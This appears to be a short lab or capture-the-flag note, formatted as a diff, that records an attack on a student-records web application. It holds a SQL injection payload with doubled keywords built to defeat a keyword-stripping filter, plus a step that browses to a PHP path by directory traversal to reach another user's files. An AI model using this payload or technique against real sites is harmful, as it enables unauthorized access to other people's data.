@@ -1,0 +1,3 @@
+[Agent LFI] abcd' uniounionn selecselectt 'aaa',id,'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj','kkk' from student whewherere name like '%LFI%' #Comment
+Now change the url to ./id/gRaB.php
+The attack works because directory traversal is allowed and malicious user can sneak into victim's directory
